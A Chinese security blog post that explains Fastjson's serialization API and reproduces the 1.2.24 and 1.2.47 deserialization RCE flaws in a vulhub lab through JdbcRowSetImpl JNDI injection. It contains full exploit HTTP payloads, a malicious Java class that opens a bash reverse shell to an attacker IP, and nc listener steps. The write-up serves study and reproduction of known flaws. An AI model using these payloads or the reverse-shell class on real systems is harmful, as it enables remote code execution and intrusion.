#  Fastjson漏洞和JNDI注入的前世今生   
Betta  火线Zone   2023-03-17 16:48  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9SdyZIgccx4UMrBLicfFaMegAJicPW1zLSRZFBXiaQUgaTjaXTkkUeKgxA/640?wx_fmt=png "")  
  
  
**简介**  
  
  
Fastjson是一个Java库，它可以解析 JSON 格式的字符串，支持将 JavaBean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。复现的环境使用的是vulhub的环境，在1.2.24fastjson的反序列化利用中有两条链  
- com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl  
  
- com.sun.rowset.JdbcRowSetImpl  
  
因为第一条链儿利用时要求变量为private的在反序列化时要加上Feature.SupportNonPublicField参数，所以在利用上来说条件有限制，所以在真实环境的利用还是以第二条链儿为主。  
  
  
**Fastjson的使用**  
  
  
在fastjson中是通过toJSONString和JSON.parseObject/parse实现序列化和反序列化  
- toJSONString()  
  
        将对象(字段)转换为JSON字符串,包括必要的字符串转义。  
- parseObject()  
  
        调用json，将json内容转化为javabean  
- JSON.parse()  
  
        调用json，将json内容转化为javabean，在使用的调用方法不一样  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9zSLHF4Prqj65AejhKVSbzsz6oInfhgx9thR6nCq0cViamibZ1SA78tzA/640?wx_fmt=png "")  
  
多了一步处理JSONObject的过程![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9e2oo1dsDeMG5R1xqCum2xeSyiacDL3eic3zyQ6gKx0XiaLF9eHyBfUHJw/640?wx_fmt=png "")  
  
  
创  
建maven项目需要使用阿里的仓库，需要配置一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9IPZ2gw1iajibatZtgqmZUD91wAojhsFBPb6ib1QwvyJN1khENELyasBJg/640?wx_fmt=png "")  
  
该demo的pom.xml为  
```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>groupId</groupId>
    <artifactId>Fastjson1.2.24_RCE</artifactId>
    <version>1.0-SNAPSHOT</version>
    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.24</version>
        </dependency>
    
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-core</artifactId>
            <version>1.5.1</version>
        </dependency>
    
        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-simple</artifactId>
            <version>1.7.25</version>
            <scope>test</scope>
        </dependency>
    
        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-nop</artifactId>
            <version>1.7.25</version>
        </dependency>
        <dependency>
            <groupId>com.alipay.sdk</groupId>
            <artifactId>alipay-sdk-java</artifactId>
            <version>4.17.9.ALL</version>
        </dependency>
    
    </dependencies>
    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.encoding>UTF-8</maven.compiler.encoding>
        <java.version>1.8</java.version>
        <maven.compiler.source>1.8</maven.compiler.source>
        <maven.compiler.target>1.8</maven.compiler.target>
    </properties>

</project>
```  
  
  
**Student.java**  
```
package fastjson;

public class Student {
    private String name;
    private int age;
    public Student() {
        System.out.println("constructed function");
    }
    public String getName() {
        System.out.println("getName");
        return name;
    }
    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }
    public void setAge(int age) {
        System.out.println("setAge");
        this.age = age;
    }

}
```  
  
  
**Seriallizer.java序列化和反序列化都放一起了**  
```
package fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Serializer {
    public static void main(String[] args){
        Student student = new Student();
        student.setName("Ggoodstudy");
        student.setAge(24);
        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);
        System.out.println(jsonstring);


        System.out.println("----------------------------------------------------------");
        String jsonstring1 =JSON.toJSONString(student);
        System.out.println(jsonstring1);
        System.out.println("----------------------------------------------------------");

        String json01 = "{\"age\":\"24\",\"name\":\"Ggoodstudy\"}";
        System.out.println(JSON.parse(json01));
        System.out.println("----------------------------------------------------------");
        System.out.println(JSON.parseObject(json01));
        System.out.println("----------------------------------------------------------");
        String json02 = "{\"@type\":\"fastjson.Student\",\"age\":\"24\",\"name\":\"Ggoodstudy\"}";
        System.out.println(JSON.parse(json02));
        System.out.println("----------------------------------------------------------");
        System.out.println(JSON.parseObject(json02));
    }
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI98jiaAYPYLuHHgq59aN90iaBVTFQUmkkUFMJ00yfPftDUKiahcwLUFqNgg/640?wx_fmt=png "")  
  
  
SerializerFeature.WriteClassName是toJSONString设置的一个属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，并且调用其方法。  
  
  
可见输出结果，在parseObject和parse将json转换内容没有区别，调用的方法不一样  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9rlafhxlWevycC9yIBv96Vb80xyJcfs3d1F6sMl2ARSIYC4p3ibBHgKg/640?wx_fmt=png "")  
  
  
而fastjson反序列化就是因为在parseObject同时触发了set和get方法，因为这种autoType造成的，所以在JdbcRowSetImpl 利用链儿中@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型。所以POC的json格式基本确定了。  
  
  
又因为dataSourceName值为RMI服务中心绑定的服务所以这里使用到了JNDI注入，那么JNDI注入的限制条件就是fastjsonJdbcRowSetImpl 链儿的限制条件，详细的JNDI注入看上篇文章。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9XYWuhoCqRcaXwKtUx0K3Fn2XNM1srXjHGnDB2DxIdIBYJcqR9W4RAg/640?wx_fmt=png "")  
  
  
  
**Fastjsonn反序列化复现以及**  
  
**JdbcRowSetImpl 链儿利用**  
  
  
ubuntu 16.04 vulhub  
  
**fastjson 1.2.24 RCE**  
  
cd vulhub-master/fastjson/1.2.24-rce  
  
docker-compose up -d  
  
  
构造payload  
```
POST / HTTP/1.1
Host: 10.10.10.36:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 167

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://10.10.10.115:1389/rce",
        "autoCommit":true
    }
}
```  
  
  
编译恶意类  
  
javac rce.java  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9jaZayu4DK2K1ntwWMuib0T7KdRicT2IGROVEVxYgKWzbpwLgftNyITQw/640?wx_fmt=png "")  
  
  
python起web服务  
  
python3 -m http.server 8888  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9T8TMicCgG1K3ngullbKGvOT4oSIe5e3BoGRSbxO3rfiaV643LLVyd2IQ/640?wx_fmt=png "")  
  
  
vps起监听  
  
nc -lvvp 7777  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9uKIdyl3l2b5uoRPvTicZx6BOlnE7xZu59ASOBahVQySSDgEPMKSuRGw/640?wx_fmt=png "")  
  
  
发送payload请求，实现rce  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9dwDs6jVliaFicSHt0JGsiccBHT1vZ5W2j0Bibyue1uZsUOrzMZCfwgicAVg/640?wx_fmt=png "")  
  
  
wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip  
  
unzip vulhub-master.zip  
  
cd vulhub-master/fastjson//1.2.47-rce  
  
docker-compose up -d  
  
  
恶意代码类rce.java  
```
import java.lang.Runtime;
import java.lang.Process;

public class rce {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.10.115/7777 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```  
  
  
构造payload  
```
POST / HTTP/1.1
Host: 10.10.10.36:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

{
    "name":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "x":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://10.10.10.115/rce",
        "autoCommit":true
    }
}
```  
  
  
发送payload  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9NmjDGM6ib0bY1IqB9BG4otKo6KsDFOsqt1617zur1gmQicz7ZRXcb2jg/640?wx_fmt=png "")  
  
  
得到shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9zuC9vGc0hX6VgGQTxVJDJMX07j1DjmCUIzIiaiatU2icymibEthfCtH1pQ/640?wx_fmt=png "")  
  
  
通过ldap实现jndi注入，达到序列化的目的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9y72zRdOjm21RsiacVCae13zH197CiavUGL8ACiaY9NG0nPtPW92msKODQ/640?wx_fmt=png "")  
  
  
只需要将payload中的协议更改为ldap协议即可，将服务方式改为LDAP服务。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR0WOuExVV6krSc4p0osYI9hNhvwlzdicnlF8FeQJuXnw6ZMhmIiapiaRGJk43iaa2JKR5MLeKGtATavg/640?wx_fmt=png "")  
  
  
**参考链接**  
  
[https://mp.weixin.qq.com/s/EqZ9E-KT7cPGyUl9haB6aQ](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652856923&idx=1&sn=0d53897ac10e80b3482e769a3ebf9f99&scene=21#wechat_redirect)  
  
  
https://www.jianshu.com/p/1ed027080459  
  
https://blog.csdn.net/qq_53264525/article/details/121741162  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRwEmIYGegWgct433pBo9TjCGtX8QcHHpNTPnNaHVUCjJEiaDAnCFpa0mlBEQNMyc5RlSYGa7NJqibQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**【火线Zone攻防安全社区群】**  
  
进群可以与技术大佬互相交流  
  
进群有机会免费领取节假日礼品  
  
进群可以免费观看技术分享直播  
  
识别二维码回复**【社区群】**进群  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSNGVibIpu9mzOH0H0nVQHEc1By10hScvF8Liaxo8ooV3icz3UqNrr1VpsKvJv60QRjyoYrIXNQDRokw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
本文来自火线Zon  
e征稿，详情请参考：  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497576&idx=1&sn=d05e82d00780adbabaef77a0e29267a6&chksm=eaa97f48dddef65eba469898fca357bf4af420a5308a97d34485536fd897ea9a4dda9e43f83b&scene=21#wechat_redirect)  
  
  
